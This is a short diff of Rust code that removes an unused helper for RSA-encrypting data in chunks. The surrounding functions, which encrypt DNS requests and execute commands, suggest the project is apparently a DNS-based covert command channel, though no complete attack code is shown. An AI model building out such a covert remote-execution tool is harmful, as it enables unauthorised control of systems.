@@ -331,19 +331,6 @@ fn dnsRequestEncryptEncode<'a>(data: &str, enc_key: &Vec<u8>, iv: &[u8]) -> Vec<
     result
 }
 
-fn encrypt_and_split(public_key: &RSAPublicKey, data: &[u8], max_payload: usize) -> Vec<Vec<u8>> {
-    let padding = PaddingScheme::PKCS1v15;
-    let mut encrypted_chunks = Vec::new();
-
-    let mut rng = rand::thread_rng();
-
-    for chunk in data.chunks(max_payload) {
-        let encrypted_chunk = public_key.encrypt(&mut rng, padding, chunk).expect("Falha na criptografia do pacote");
-        encrypted_chunks.push(encrypted_chunk);
-    }
-
-    encrypted_chunks
-}
 
 fn commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_internal: &RsaPrivateKey){
     let key = base32::decode(Alphabet::RFC4648 { padding: true }, aes_key).unwrap();
@@ -412,9 +399,6 @@ fn commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_i
         let encodedData = base64::encode(&encData);
 
         let max_payload = 1024 / 8 - 11;
-
-        // Dividir e criptografar os dados
-        let encrypted_data = encrypt_and_split(&public_key, &data[..], max_payload);
     
     
         let fData = format!("{}|{}", s, encodedData);
